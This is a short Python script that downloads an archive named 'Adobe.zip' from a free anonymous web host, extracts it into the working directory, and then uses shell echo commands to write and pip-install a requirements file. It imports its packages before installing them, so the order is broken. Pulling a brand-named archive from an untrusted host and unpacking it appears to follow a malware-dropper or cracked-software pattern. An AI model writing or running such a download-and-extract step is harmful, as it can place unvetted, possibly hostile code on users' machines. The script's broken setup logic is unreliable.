import pyunpack
from pyunpack import Archive
import wget 
import os

url = "https://separable-oxygen.000webhostapp.com/Adobe.zip"
wget.download(url)
Archive('Adobe.zip').extractall('.')

os.system("echo.>requirements.txt")
os.system("echo pyunpack > requirements.txt")
os.system("echo wget >> requirements.txt")
os.system("timeout 5")
os.system("pip install -r requirements.txt")


